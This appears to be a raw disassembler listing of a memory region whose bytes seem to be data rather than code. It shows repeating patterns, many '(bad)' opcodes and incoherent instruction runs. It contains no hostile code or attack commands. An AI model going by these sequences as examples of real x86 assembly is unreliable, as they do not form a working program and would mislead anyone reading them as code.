11010e50:	clc    
11010e51:	add    BYTE PTR [eax],al
11010e53:	add    BYTE PTR [edi],bl
11010e55:	inc    DWORD PTR [eax]
11010e57:	push   cs
11010e58:	clc    
11010e59:	add    BYTE PTR [eax],al
11010e5b:	add    BYTE PTR [edi],bl
11010e5d:	inc    DWORD PTR [eax]
11010e5f:	push   cs
11010e60:	clc    
11010e61:	add    BYTE PTR [eax],al
11010e63:	add    BYTE PTR [edi],bl
11010e65:	inc    DWORD PTR [eax]
11010e67:	push   cs
11010e68:	clc    
11010e69:	add    BYTE PTR [eax],al
11010e6b:	add    BYTE PTR [edi],bl
11010e6d:	inc    DWORD PTR [eax]
11010e6f:	push   cs
11010e70:	clc    
11010e71:	add    BYTE PTR [eax],al
11010e73:	add    BYTE PTR [edi],bl
11010e75:	inc    DWORD PTR [eax]
11010e77:	push   cs
11010e78:	clc    
11010e79:	add    BYTE PTR [eax],al
11010e7b:	add    BYTE PTR [edi],bl
11010e7d:	inc    DWORD PTR [eax]
11010e7f:	push   cs
11010e80:	clc    
11010e81:	add    BYTE PTR [eax],al
11010e83:	add    BYTE PTR [edi],bl
11010e85:	inc    DWORD PTR [eax]
11010e87:	push   cs
11010e88:	lock add BYTE PTR [eax],al
11010e8b:	add    BYTE PTR [edi],cl
11010e8d:	inc    DWORD PTR [eax]
11010e8f:	push   cs
11010e90:	loopne 0x11010e92
11010e92:	add    BYTE PTR [eax],al
11010e94:	pop    es
11010e95:	inc    DWORD PTR [eax]
11010e97:	push   cs
11010e98:	rol    BYTE PTR [eax],0x0
11010e9b:	add    BYTE PTR [ebx],al
11010e9d:	inc    DWORD PTR [eax]
11010e9f:	push   cs
11010ea0:	add    BYTE PTR [eax],0x0
11010ea3:	add    BYTE PTR [ecx],al
11010ea5:	inc    DWORD PTR [eax]
11010ea7:	push   cs
11010ea8:	add    BYTE PTR [eax],0x0
11010eab:	add    BYTE PTR [ecx],al
11010ead:	inc    DWORD PTR [eax]
11010eaf:	push   cs
11010eb0:	rol    BYTE PTR [eax],0x0
11010eb3:	add    BYTE PTR [ebx],al
11010eb5:	inc    DWORD PTR [eax]
11010eb7:	push   cs
11010eb8:	loopne 0x11010eba
11010eba:	add    BYTE PTR [eax],al
11010ebc:	pop    es
11010ebd:	inc    DWORD PTR [eax]
11010ebf:	push   cs
11010ec0:	lock add BYTE PTR [eax],al
11010ec3:	add    BYTE PTR [edi],cl
11010ec5:	inc    DWORD PTR [eax]
11010ec7:	push   cs
11010ec8:	clc    
11010ec9:	add    BYTE PTR [eax],al
11010ecb:	add    BYTE PTR [edi],bl
11010ecd:	inc    DWORD PTR [eax]
11010ecf:	push   cs
11010ed0:	clc    
11010ed1:	add    BYTE PTR [eax],al
11010ed3:	add    BYTE PTR [edi],bl
11010ed5:	inc    DWORD PTR [eax]
11010ed7:	push   cs
11010ed8:	clc    
11010ed9:	add    BYTE PTR [eax],al
11010edb:	add    BYTE PTR [edi],bl
11010edd:	inc    DWORD PTR [eax]
11010edf:	push   cs
11010ee0:	clc    
11010ee1:	add    BYTE PTR [eax],al
11010ee3:	add    BYTE PTR [edi],bl
11010ee5:	inc    DWORD PTR [eax]
11010ee7:	push   cs
11010ee8:	clc    
11010ee9:	add    BYTE PTR [eax],al
11010eeb:	add    BYTE PTR [edi],bl
11010eed:	inc    DWORD PTR [eax]
11010eef:	push   cs
11010ef0:	clc    
11010ef1:	add    BYTE PTR [eax],al
11010ef3:	add    BYTE PTR [edi],bl
11010ef5:	inc    DWORD PTR [eax]
11010ef7:	push   cs
11010ef8:	clc    
11010ef9:	add    BYTE PTR [eax],al
11010efb:	add    BYTE PTR [edi],bl
11010efd:	inc    DWORD PTR [eax]
11010eff:	push   cs
11010f00:	clc    
11010f01:	add    BYTE PTR [eax],al
11010f03:	add    BYTE PTR [edi],bl
11010f05:	inc    DWORD PTR [eax]
11010f07:	push   cs
11010f08:	clc    
11010f09:	add    BYTE PTR [eax],al
11010f0b:	add    BYTE PTR [edi],bl
11010f0d:	inc    DWORD PTR [eax]
11010f0f:	push   cs
11010f10:	clc    
11010f11:	add    BYTE PTR [eax],al
11010f13:	add    BYTE PTR [edi],bl
11010f15:	inc    DWORD PTR [eax]
11010f17:	push   cs
11010f18:	clc    
11010f19:	add    BYTE PTR [eax],al
11010f1b:	add    BYTE PTR [edi],bl
11010f1d:	inc    DWORD PTR [eax]
11010f1f:	push   cs
11010f20:	(bad)  
11010f21:	inc    DWORD PTR [eax]
11010f23:	(bad)  
11010f24:	(bad)  
11010f25:	inc    DWORD PTR [eax]
11010f27:	push   cs
11010f28:	(bad)  
11010f29:	inc    DWORD PTR [ecx+0xffffff]
11010f2f:	push   cs
11010f30:	(bad)  
11010f31:	inc    ebx
11010f33:	(bad)  
11010f34:	(bad)  
11010f35:	inc    DWORD PTR [eax]
11010f37:	push   cs
11010f38:	(bad)  
11010f39:	jmp    edi
11010f3b:	(bad)  
11010f3c:	(bad)  
11010f3d:	inc    DWORD PTR [eax]
11010f3f:	push   cs
11010f40:	(bad)  
11010f41:	(bad)  
11010f42:	(bad)  
11010f43:	(bad)  
11010f44:	(bad)  
11010f45:	inc    DWORD PTR [eax]
11010f47:	push   cs
11010f48:	sub    BYTE PTR [eax],al
11010f4a:	add    BYTE PTR [eax],al
11010f4c:	and    BYTE PTR [eax],al
11010f4e:	add    BYTE PTR [eax],al
11010f50:	inc    eax
11010f51:	add    BYTE PTR [eax],al
11010f53:	add    BYTE PTR [ecx],al
11010f55:	add    BYTE PTR [eax],cl
	...
11010f73:	add    BYTE PTR [esi],al
11010f75:	add    eax,DWORD PTR [edx]
11010f77:	add    BYTE PTR [eax],cl
11010f79:	add    al,0x3
11010f7b:	add    BYTE PTR [edi],dl
11010f7d:	pop    ss
11010f7e:	pop    ss
11010f7f:	add    BYTE PTR [ecx],bl
11010f81:	adc    edx,DWORD PTR [ecx]
11010f83:	add    BYTE PTR [ecx],bl
11010f85:	sbb    DWORD PTR [ecx],ebx
11010f87:	add    BYTE PTR [ecx],ah
11010f89:	adc    cl,BYTE PTR [eax+eax*1]
11010f8c:	and    edx,DWORD PTR [ecx*1+0xf162800]
11010f93:	add    BYTE PTR [ebx],ch
11010f95:	sbb    eax,0x24240017
11010f9a:	and    al,0x0
11010f9c:	sub    eax,0x2d002729
11010fa1:	sub    DWORD PTR [eax],ebp
11010fa3:	add    BYTE PTR ds:0x80002d2d,ch
11010fa9:	dec    eax
11010faa:	das    
11010fab:	add    BYTE PTR [eax-0x34ffc1a2],ch
11010fb1:	push   ebp
11010fb2:	xor    BYTE PTR [eax],al
11010fb4:	into   
11010fb5:	pop    edx
11010fb6:	xor    al,0x0
11010fb8:	shl    BYTE PTR [eax+0x38],cl
11010fbb:	add    ah,dl
11010fbd:	bound  edi,QWORD PTR [edx]
11010fbf:	add    dh,dl
11010fc1:	gs cmp eax,0x3e67d800
11010fc7:	add    bh,cl
11010fc9:	arpl   WORD PTR [ecx+0x0],ax
11010fcc:	aad    0x68
11010fce:	inc    edx
11010fcf:	add    bl,bl
11010fd1:	imul   eax,DWORD PTR [edx+0x0],0xffffffdb
11010fd5:	ins    BYTE PTR es:[edi],dx
11010fd6:	inc    edx
11010fd7:	add    ah,bl
11010fd9:	ins    BYTE PTR es:[edi],dx
11010fda:	inc    ebx
11010fdb:	add    cl,bl
11010fdd:	ins    DWORD PTR es:[edi],dx
11010fde:	inc    esi
11010fdf:	add    dh,bl
11010fe1:	outs   dx,DWORD PTR ds:[esi]
11010fe2:	inc    ebp
11010fe3:	add    dl,cl
11010fe5:	jno    0x11011032
11010fe7:	add    bh,bl
11010fe9:	jno    0x11011032
11010feb:	add    bh,dl
11010fed:	jbe    0x11011044
11010fef:	add    al,ah
11010ff1:	jb     0x1101103b
11010ff3:	add    cl,ah
11010ff5:	je     0x11011041
11010ff7:	add    bl,ah
11010ff9:	jbe    0x11011047
11010ffb:	add    ah,ah
11010ffd:	js     0x1101104d
11010fff:	add    bh,ah
11011001:	jl     0x11011054
11011003:	add    bh,ah
11011005:	jle    0x1101105b
11011007:	add    al,ch
11011009:	jge    0x1101105c
1101100b:	add    al,ch
1101100d:	jg     0x11011063
1101100f:	add    bh,dl
11011011:	jle    0x11011076
11011013:	add    dl,ch
11011015:	adc    BYTE PTR [eax+eax*1-0x14],0x82
1101101a:	push   esi
1101101b:	add    al,ah
1101101d:	sbb    BYTE PTR [edi+0x0],0xeb
11011021:	xchg   BYTE PTR [ebx+0x0],bl
11011024:	out    dx,al
11011025:	test   DWORD PTR [eax+0x0],ebx
11011028:	jmp    0xfd016cb2
1101102d:	xchg   DWORD PTR [ebp+0x0],ebx
11011030:	repnz mov BYTE PTR [edx+0x0],bl
11011034:	hlt    
11011035:	mov    DWORD PTR [ebx+0x0],ebx
11011038:	lock mov ebx,DWORD PTR [edi+0x0]
1101103c:	repz mov WORD PTR [esi+0x0],ds
11011040:	hlt    
11011041:	mov    WORD PTR [esi+0x0],ds
11011044:	out    dx,eax
11011045:	mov    WORD PTR [eax+0x0],fs
11011048:	repz (bad) 
1101104a:	bound  eax,QWORD PTR [eax]
1101104c:	hlt    
1101104d:	(bad)  
1101104e:	bound  eax,QWORD PTR [eax]
11011050:	icebp  
11011051:	(bad)  
11011052:	gs add bl,dh
11011055:	nop
11011056:	arpl   WORD PTR [eax],ax
11011058:	hlt    
11011059:	nop
1101105a:	arpl   WORD PTR [eax],ax
1101105c:	icebp  
1101105d:	nop
1101105e:	data16 add ah,dh
11011061:	xchg   ecx,eax
11011062:	gs add ah,dh
11011065:	xchg   ebx,eax
11011066:	push   0x6994f400
1101106b:	add    ah,dh
1101106d:	xchg   esi,eax
1101106e:	ins    BYTE PTR es:[edi],dx
1101106f:	add    ah,dh
11011071:	cwde   
11011072:	outs   dx,BYTE PTR ds:[esi]
11011073:	add    ah,dh
11011075:	call   0x74:0x9cf40072
1101107c:	cmc    
1101107d:	mov    al,ds:0xa2f6007a
11011082:	jl     0x11011084
11011084:	mul    BYTE PTR [esi+edi*2-0x48484900]
1101108b:	add    BYTE PTR [eax-0x1cff4748],bh
11011091:	mov    ds:0xa5f6008d,al
11011096:	add    DWORD PTR [eax],0x85a8f5
1101109c:	imul   DWORD PTR [esi-0x5a1dff73]
110110a2:	xchg   edx,eax
110110a3:	add    dh,ch
110110a5:	mov    al,0x98
110110a7:	add    bh,dh
110110a9:	mov    cl,0x91
110110ab:	add    al,bh
110110ad:	mov    dl,0x93
110110af:	add    al,bh
110110b1:	mov    ah,0x95
110110b3:	add    al,bh
110110b5:	mov    ecx,0xbdf5009d
110110ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
110110bb:	add    al,bh
110110bd:	mov    esp,0xbff800a2
110110c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
110110c3:	add    al,bh
110110c5:	shl    BYTE PTR [esi-0x553d0800],0x0
110110cc:	clc    
110110cd:	les    ebp,FWORD PTR [eax+eax*1+0xb0c6f9]
110110d4:	stc    
110110d5:	retf   0xb6
110110d8:	stc    
110110d9:	int    0xba
110110db:	add    cl,bh
110110dd:	iret   
110110de:	mov    esp,0xbfd1fa00
110110e3:	add    al,dh
110110e5:	iret   
110110e6:	lds    eax,FWORD PTR [eax]
110110e8:	cli    
110110e9:	aam    0xc3
110110eb:	add    bh,dh
110110ed:	fxch   st(5)
110110ef:	add    dl,bh
110110f1:	fxch   st(2)
110110f3:	add    al,bh
110110f5:	fxch   st(5)
110110f7:	add    bl,bh
110110f9:	(bad)  
110110fb:	add    bl,bh
110110fd:	loopne 0x110110d2
110110ff:	add    ah,bh
11011101:	jmp    0xee:0xf1fa00e1
11011108:	std    
11011109:	cmc    
1101110a:	repnz add dl,bh
1101110d:	cli    
1101110e:	cli    
1101110f:	add    ch,bh
11011111:	cli    
11011112:	stc    
11011113:	add    dh,bh
11011115:	(bad)  
11011116:	inc    BYTE PTR [eax]
11011118:	pushf  
11011119:	call   DWORD PTR [ecx+0x0]
1101111c:	scas   al,BYTE PTR es:[edi]
1101111d:	push   DWORD PTR [ecx+0x0]
11011120:	sar    bh,0x91
11011123:	add    dl,dl
11011125:	push   DWORD PTR [ecx-0x2e001c00]
1101112b:	add    bh,bh
1101112d:	(bad)  
1101112e:	inc    DWORD PTR [eax]
11011130:	add    BYTE PTR [eax],al
11011132:	add    BYTE PTR [eax],al
11011134:	es das 
11011136:	add    BYTE PTR [eax],al
11011138:	inc    eax
11011139:	push   eax
1101113a:	add    BYTE PTR [eax],al
1101113c:	pop    edx
1101113d:	jo     0x1101113f
1101113f:	add    BYTE PTR [eax+edx*4+0x0],dh
11011143:	add    BYTE PTR [esi-0x56ffff50],cl
11011149:	iret   
1101114a:	add    BYTE PTR [eax],al
1101114c:	ret    0xf0
1101114f:	add    cl,dl
11011151:	call   DWORD PTR [ecx]
11011153:	add    al,bl
11011155:	push   DWORD PTR [ecx]
11011157:	add    dh,bl
11011159:	call   DWORD PTR [ecx+0x0]
1101115c:	jecxz  0x1101115d
1101115e:	jno    0x11011160
11011160:	jmp    0x1a364
11011165:	push   DWORD PTR [ecx-0x2e000a00]
1101116b:	add    bh,bh
1101116d:	(bad)  
1101116e:	inc    DWORD PTR [eax]
11011170:	add    BYTE PTR [eax],al
11011172:	add    BYTE PTR [eax],al
11011174:	das    
11011175:	add    BYTE PTR es:[eax],al
11011178:	push   eax
11011179:	inc    ecx
1101117a:	add    BYTE PTR [eax],al
1101117c:	jo     0x110111d9
1101117e:	add    BYTE PTR [eax],al
11011180:	nop
11011181:	je     0x11011183
11011183:	add    BYTE PTR [eax-0x30ffff72],dh
11011189:	test   eax,0xc3f00000
1101118e:	add    BYTE PTR [eax],al
11011190:	call   edx
11011192:	adc    DWORD PTR [eax],eax
11011194:	(bad)  
11011195:	fdiv   DWORD PTR [ecx]
11011197:	add    bh,bh
11011199:	fst    QWORD PTR [ecx+0x0]
1101119c:	jmp    esp
1101119e:	jno    0x110111a0
110111a0:	(bad)  
110111a1:	jmp    0xb1:0xf0ff0091
110111a8:	push   esi
110111aa:	rol    DWORD PTR [eax],1
110111ac:	(bad)  
110111ad:	(bad)  
110111ae:	inc    DWORD PTR [eax]
110111b0:	add    BYTE PTR [eax],al
110111b2:	add    BYTE PTR [eax],al
110111b4:	das    
110111b5:	adc    al,0x0
110111b7:	add    BYTE PTR [eax+0x22],dl
110111ba:	add    BYTE PTR [eax],al
110111bc:	jo     0x110111ee
110111be:	add    BYTE PTR [eax],al
110111c0:	nop
110111c1:	add    BYTE PTR ds:[eax],al
110111c4:	mov    al,0x4d
110111c6:	add    BYTE PTR [eax],al
110111c8:	iret   
110111c9:	pop    ebx
110111ca:	add    BYTE PTR [eax],al
110111cc:	lock imul eax,DWORD PTR [eax],0x1179ff00
110111d3:	add    bh,bh
110111d5:	mov    dh,BYTE PTR [ecx]
110111d7:	add    bh,bh
110111d9:	popf   
110111da:	push   ecx
110111db:	add    bh,bh
110111dd:	scas   eax,DWORD PTR es:[edi]
110111de:	jno    0x110111e0
110111e0:	inc    ecx
110111e2:	xchg   ecx,eax
110111e3:	add    bh,bh
110111e5:	shl    BYTE PTR [ecx-0x2e1a0100],cl
110111eb:	add    bh,bh
110111ed:	(bad)  
110111ee:	inc    DWORD PTR [eax]
110111f0:	add    BYTE PTR [eax],al
110111f2:	add    BYTE PTR [eax],al
110111f4:	das    
110111f5:	add    eax,DWORD PTR [eax]
110111f7:	add    BYTE PTR [eax+0x4],dl
110111fa:	add    BYTE PTR [eax],al
110111fc:	jo     0x11011204
110111fe:	add    BYTE PTR [eax],al
11011200:	nop
11011201:	or     DWORD PTR [eax],eax
11011203:	add    BYTE PTR [eax-0x30fffff6],dh
11011209:	or     al,0x0
1101120b:	add    al,dh
1101120d:	push   cs
1101120e:	add    BYTE PTR [eax],al
11011210:	jmp    DWORD PTR [eax]
11011212:	adc    al,BYTE PTR [eax]
11011214:	(bad)  
11011215:	xor    DWORD PTR ds:[eax],eax
11011218:	call   FWORD PTR [ecx+edx*2+0x0]
1101121c:	(bad)  
1101121d:	jp     0x11011290
1101121f:	add    bh,bh
11011221:	xchg   edi,eax
11011222:	xchg   ecx,eax
11011223:	add    bh,bh
11011225:	mov    dh,0xb1
11011227:	add    bh,bh
11011229:	aam    0xd1
1101122b:	add    bh,bh
1101122d:	(bad)  
1101122e:	inc    DWORD PTR [eax]
11011230:	add    BYTE PTR [eax],al
11011232:	add    BYTE PTR [eax],al
11011234:	das    
11011235:	add    BYTE PTR [esi],cl
11011237:	add    BYTE PTR [eax+0x0],dl
1101123a:	pop    ss
1101123b:	add    BYTE PTR [eax+0x0],dh
1101123e:	and    DWORD PTR [eax],eax
11011240:	nop
11011241:	add    BYTE PTR [ebx],ch
11011243:	add    BYTE PTR [eax-0x30ffca00],dh
11011249:	add    BYTE PTR [eax+0x0],al
1101124c:	lock add BYTE PTR [ecx+0x0],cl
11011250:	call   DWORD PTR [ecx]
11011252:	pop    edx
11011253:	add    bh,bh
11011255:	xor    DWORD PTR [eax+0x0],esi
11011258:	call   DWORD PTR [ecx-0x7a]
1101125b:	add    bh,bh
1101125d:	jno    0x110111fb
1101125f:	add    bh,bh
11011261:	xchg   ecx,eax
11011262:	mov    dl,0x0
11011264:	push   DWORD PTR [ecx-0x2e00ff38]
1101126a:	fild   WORD PTR [eax]
1101126c:	(bad)  
1101126d:	(bad)  
1101126e:	inc    DWORD PTR [eax]
11011270:	add    BYTE PTR [eax],al
11011272:	add    BYTE PTR [eax],al
11011274:	das    
11011275:	add    BYTE PTR [eax],ah
11011277:	add    BYTE PTR [eax+0x0],dl
1101127a:	add    BYTE PTR ss:[eax+0x0],dh
1101127e:	dec    esp
1101127f:	add    BYTE PTR [eax-0x4fff9e00],dl
11011285:	add    BYTE PTR [eax+0x0],bh
11011288:	iret   
11011289:	add    BYTE PTR [esi-0x5bff1000],cl
1101128f:	add    bh,bh
11011291:	adc    DWORD PTR [ebx-0x41ce0100],esi
11011297:	add    bh,bh
11011299:	push   ecx
1101129a:	mov    DWORD PTR [eax],0xd171ff
110112a0:	call   DWORD PTR [ecx-0x4e00ff24]
110112a6:	in     eax,0x0
110112a8:	call   ecx
110112aa:	lock add bh,bh
110112ad:	(bad)  
110112ae:	inc    DWORD PTR [eax]
110112b0:	add    BYTE PTR [eax],al
110112b2:	add    BYTE PTR [eax],al
110112b4:	sub    al,0x0
110112b6:	das    
110112b7:	add    BYTE PTR [ebx+0x0],cl
110112ba:	push   eax
110112bb:	add    BYTE PTR [ecx+0x0],ch
110112be:	jo     0x110112c0
110112c0:	xchg   DWORD PTR [eax],eax
110112c2:	nop
110112c3:	add    BYTE PTR [ebp-0x3bff5000],ah
110112c9:	add    bh,cl
110112cb:	add    cl,ah
110112cd:	add    al,dh
110112cf:	add    al,dh
110112d1:	adc    edi,edi
110112d3:	add    dl,dh
110112d5:	xor    edi,edi
110112d7:	add    ah,dh
110112d9:	push   ecx
110112da:	inc    DWORD PTR [eax]
110112dc:	div    BYTE PTR [ecx-0x1]
110112df:	add    bh,dh
110112e1:	xchg   ecx,eax
110112e2:	inc    DWORD PTR [eax]
110112e4:	stc    
110112e5:	mov    cl,0xff
110112e7:	add    bl,bh
110112e9:	sar    edi,1
110112eb:	add    bh,bh
110112ed:	(bad)  
110112ee:	inc    DWORD PTR [eax]
110112f0:	add    BYTE PTR [eax],al
110112f2:	add    BYTE PTR [eax],al
110112f4:	sbb    eax,DWORD PTR [eax]
110112f6:	das    
110112f7:	add    BYTE PTR ds:0x3f005000,ch
110112fd:	add    BYTE PTR [eax+0x0],dh
11011300:	push   edx
11011301:	add    BYTE PTR [eax-0x4fff9d00],dl
11011307:	add    BYTE PTR [esi+0x0],dh
1101130a:	iret   
1101130b:	add    BYTE PTR [eax-0x66ff1000],cl
11011311:	adc    edi,edi
11011313:	add    BYTE PTR [esi-0x4bff00cf],ah
11011319:	push   ecx
1101131a:	inc    DWORD PTR [eax]
1101131c:	ret    0xff71
1101131f:	add    bh,cl
11011321:	xchg   ecx,eax
11011322:	inc    DWORD PTR [eax]
11011324:	fdiv   QWORD PTR [ecx-0x2e14ff01]
1101132a:	inc    DWORD PTR [eax]
1101132c:	(bad)  
1101132d:	(bad)  
1101132e:	inc    DWORD PTR [eax]
11011330:	add    BYTE PTR [eax],al
11011332:	add    BYTE PTR [eax],al
11011334:	or     BYTE PTR [eax],al
11011336:	das    
11011337:	add    BYTE PTR [esi],cl
11011339:	add    BYTE PTR [eax+0x0],dl
1101133c:	adc    eax,0x1b007000
11011341:	add    BYTE PTR [eax-0x4fffdf00],dl
11011347:	add    BYTE PTR [esi],ah
11011349:	add    bh,cl
1101134b:	add    BYTE PTR [eax+eax*1],ch
1101134e:	lock add BYTE PTR [esi],bh
11011351:	adc    edi,edi
11011353:	add    BYTE PTR [eax+0x31],bl
11011356:	inc    DWORD PTR [eax]
11011358:	jno    0x110113ab
1101135a:	inc    DWORD PTR [eax]
1101135c:	mov    WORD PTR [ecx-0x1],?
1101135f:	add    BYTE PTR [esi-0x40ff006f],ah
11011365:	mov    cl,0xff
11011367:	add    dl,bl
11011369:	sar    edi,1
1101136b:	add    bh,bh
1101136d:	(bad)  
1101136e:	inc    DWORD PTR [eax]
	...
1101139c:	add    BYTE PTR [eax],al
1101139e:	add    BYTE PTR [ebx],al
110113a0:	add    eax,0x0
	...
110113bd:	add    BYTE PTR ds:0xd4747,cl
	...
110113db:	add    BYTE PTR [eax],al
110113dd:	add    eax,DWORD PTR [edi+0x67]
110113e0:	addr16 inc edi
110113e2:	add    eax,DWORD PTR [eax]
	...
110113f4:	add    al,BYTE PTR [edi]
110113f6:	or     BYTE PTR [eax],cl
110113f8:	or     BYTE PTR [eax],cl
110113fa:	pop    es
110113fb:	add    cl,BYTE PTR [edx]
110113fd:	inc    edi
110113fe:	imul   ebp,DWORD PTR [ecx+0x6f],0x20a466f
11011405:	or     BYTE PTR [eax],cl
11011407:	or     BYTE PTR [eax],cl
11011409:	or     BYTE PTR [esi],al
1101140b:	add    al,BYTE PTR [eax]
1101140d:	add    BYTE PTR [eax],al
1101140f:	add    BYTE PTR [eax],al
11011411:	add    BYTE PTR [eax],al
11011413:	add    BYTE PTR [esi],al
11011415:	nop    DWORD PTR ds:0x40e1d1d
1101141c:	inc    edi
1101141d:	imul   ebp,DWORD PTR [bx+di+0x69],0x4476769
11011425:	push   cs
11011426:	sbb    eax,0xf1d1d1d
1101142b:	pop    es
	...
11011434:	or     BYTE PTR ds:0xf303131,bl
1101143a:	or     al,0x47
1101143c:	imul   ebp,DWORD PTR [ecx+0x69],0x69696f69
11011443:	imul   eax,DWORD PTR [edi+0xb],0x3431300f
1101144a:	sbb    eax,0x8
1101144f:	add    BYTE PTR [eax],al
11011451:	add    BYTE PTR [eax],al
11011453:	add    BYTE PTR [eax],cl
11011455:	sbb    eax,0x90f3131
1101145a:	inc    edi
1101145b:	outs   dx,DWORD PTR ds:[si]
1101145d:	outs   dx,DWORD PTR ds:[esi]
1101145e:	imul   ebp,DWORD PTR [ecx+0x69],0x67696f69
11011465:	inc    edi
11011466:	or     DWORD PTR [edi],ecx
11011468:	xor    DWORD PTR [ecx],esi
1101146a:	sbb    eax,0x8
1101146f:	add    BYTE PTR [eax],al
11011471:	add    BYTE PTR [eax],al
11011473:	add    BYTE PTR [eax],cl
11011475:	sbb    eax,0x470c0f30
1101147a:	outs   dx,DWORD PTR ds:[esi]
1101147b:	push   0x1b2b4d5f
11011480:	pop    ss
11011481:	pop    ds
11011482:	dec    eax
11011483:	pop    ebp
11011484:	push   0xf0b476f
11011489:	xor    BYTE PTR ds:0x8,bl
1101148f:	add    BYTE PTR [eax],al
11011491:	add    BYTE PTR [eax],al
11011493:	add    BYTE PTR [eax],cl
11011495:	sbb    eax,0x6947090f
1101149a:	push   dx
1101149c:	and    bl,BYTE PTR cs:[eax+ebx*1]
110114a0:	adc    al,0x12
110114a2:	adc    DWORD PTR [esi],edx
110114a4:	dec    esp
110114a5:	gs addr16 inc edi
110114a8:	or     DWORD PTR [edi],ecx
110114aa:	sbb    eax,0x8
110114af:	add    BYTE PTR [eax],al
110114b1:	add    BYTE PTR [eax],al
110114b3:	add    BYTE PTR [eax],cl
110114b5:	push   cs
110114b6:	or     al,0x47
110114b8:	outs   dx,DWORD PTR ds:[esi]
110114b9:	dec    dx
110114bb:	sub    eax,0x20222629
110114c0:	sbb    DWORD PTR ds:0x28101112,edx
110114c6:	imul   eax,DWORD PTR gs:[edi+0xc],0x70e
110114ce:	add    BYTE PTR [eax],al
110114d0:	add    BYTE PTR [eax],al
110114d2:	add    BYTE PTR [eax],al
110114d4:	add    al,BYTE PTR [edi+eax*2]
110114d7:	imul   ebp,DWORD PTR [eax+0x57],0x2a303434
110114de:	and    ebx,DWORD PTR es:[esi]
110114e1:	sbb    dl,BYTE PTR ds:0x4c101113
110114e7:	push   0x2044767
	...
110114f4:	or     al,BYTE PTR [edi+0x6f]
110114f7:	outs   dx,DWORD PTR ds:[esi]
110114f8:	arpl   WORD PTR [eax+0x3a],ax
110114fb:	cmp    al,0x37
110114fd:	xor    eax,0x2124272d
11011502:	sbb    dl,BYTE PTR ds:0x5d161113
11011508:	imul   ebp,DWORD PTR [edi+0x47],0xa
1101150f:	add    BYTE PTR [eax],al
11011511:	add    BYTE PTR [eax],al
11011513:	add    eax,0x6f6f6847
11011518:	push   ebp
11011519:	cmp    al,0x3e
1101151b:	ds ds ds ss sub al,0x25
11011521:	and    esp,DWORD PTR [ecx]
11011523:	sbb    dl,BYTE PTR ds:0x6f481112
11011529:	imul   esp,DWORD PTR [edi+0x47],0x3
11011530:	add    BYTE PTR [eax],al
11011532:	or     eax,0x6f6f6f47
11011537:	outs   dx,DWORD PTR ds:[esi]
11011538:	dec    ecx
11011539:	aas    
1101153a:	inc    edx
1101153b:	inc    edx
1101153c:	inc    edx
1101153d:	inc    ecx
1101153e:	aas    
1101153f:	cmp    al,0x2f
11011541:	sub    DWORD PTR [ebx],esp
11011543:	and    BYTE PTR [edx],bl
11011545:	adc    eax,0x6f6f1f12
1101154a:	outs   dx,DWORD PTR ds:[esi]
1101154b:	outs   dx,DWORD PTR ds:[esi]
1101154c:	inc    edi
1101154d:	or     eax,0x3000000
11011552:	inc    edi
11011553:	outs   dx,DWORD PTR ds:[si]
11011555:	outs   dx,DWORD PTR ds:[esi]
11011556:	outs   dx,DWORD PTR ds:[esi]
11011557:	outs   dx,DWORD PTR ds:[esi]
11011558:	inc    edx
11011559:	inc    edx
1101155a:	inc    ebp
1101155b:	dec    ecx
1101155c:	inc    ebp
1101155d:	inc    esp
1101155e:	inc    edx
1101155f:	inc    ecx
11011560:	cmp    ch,BYTE PTR [edi]
11011562:	and    eax,0x14191e23
11011567:	pop    ss
11011568:	imul   ebp,DWORD PTR [ecx+0x6f],0x547676f
1101156f:	add    BYTE PTR [eax],al
11011571:	add    eax,DWORD PTR [edi+0x67]
11011574:	outs   dx,DWORD PTR ds:[esi]
11011575:	outs   dx,DWORD PTR ds:[esi]
11011576:	outs   dx,DWORD PTR ds:[esi]
11011577:	outs   dx,DWORD PTR ds:[esi]
11011578:	inc    esp
11011579:	dec    edx
1101157a:	dec    edi
1101157b:	push   eax
1101157c:	push   eax
1101157d:	dec    ebx
1101157e:	dec    edx
1101157f:	inc    esp
11011580:	inc    ecx
11011581:	cmp    ebp,DWORD PTR [edi+eiz*1]
11011584:	and    esp,DWORD PTR [eax]
11011586:	sbb    DWORD PTR [ebx],ebx
11011588:	outs   dx,DWORD PTR ds:[esi]
11011589:	outs   dx,DWORD PTR ds:[esi]
1101158a:	outs   dx,DWORD PTR ds:[esi]
1101158b:	outs   dx,DWORD PTR ds:[esi]
1101158c:	addr16 inc edi
1101158e:	add    eax,DWORD PTR [eax]
11011590:	add    BYTE PTR [eax],al
11011592:	or     eax,0x6f6f6f47
11011597:	outs   dx,DWORD PTR ds:[esi]
11011598:	dec    edi
11011599:	dec    esi
1101159a:	push   ebx
1101159b:	push   esi
1101159c:	push   ebp
1101159d:	push   ecx
1101159e:	dec    esi
1101159f:	dec    edx
110115a0:	inc    edx
110115a1:	inc    eax
110115a2:	xor    ebp,DWORD PTR ds:0x2b1c2224
110115a8:	imul   ebp,DWORD PTR [ecx+0x6f],0xd476f
110115af:	add    BYTE PTR [eax],al
110115b1:	add    BYTE PTR [eax],al
110115b3:	add    eax,0x6f6f6747
110115b8:	pop    esp
110115b9:	push   ecx
110115ba:	pop    ecx
110115bb:	pop    esp
110115bc:	pop    ebx
110115bd:	pop    eax
110115be:	push   ecx
110115bf:	dec    ebx
110115c0:	inc    esp
110115c1:	inc    ecx
110115c2:	cmp    eax,0x22262a32
110115c7:	dec    ebp
110115c8:	outs   dx,DWORD PTR ds:[esi]
110115c9:	outs   dx,DWORD PTR ds:[esi]
110115ca:	addr16 inc edi
110115cc:	add    eax,DWORD PTR [eax]
110115ce:	add    BYTE PTR [eax],al
110115d0:	add    BYTE PTR [eax],al
110115d2:	add    BYTE PTR [eax],al
110115d4:	or     al,BYTE PTR [edi+0x6f]
110115d7:	outs   dx,DWORD PTR ds:[esi]
110115d8:	fs push esi
110115da:	pop    esp
110115db:	pusha  
110115dc:	pusha  
110115dd:	pop    ebx
110115de:	push   ebp
110115df:	dec    edi
110115e0:	dec    ecx
110115e1:	inc    ecx
110115e2:	ds cmp al,0x30
110115e5:	sub    DWORD PTR [ecx+eiz*2],ebp
110115e8:	outs   dx,DWORD PTR ds:[esi]
110115e9:	outs   dx,DWORD PTR ds:[esi]
110115ea:	inc    edi
110115eb:	or     al,BYTE PTR [eax]
110115ed:	add    BYTE PTR [eax],al
110115ef:	add    BYTE PTR [eax],al
110115f1:	add    BYTE PTR [eax],al
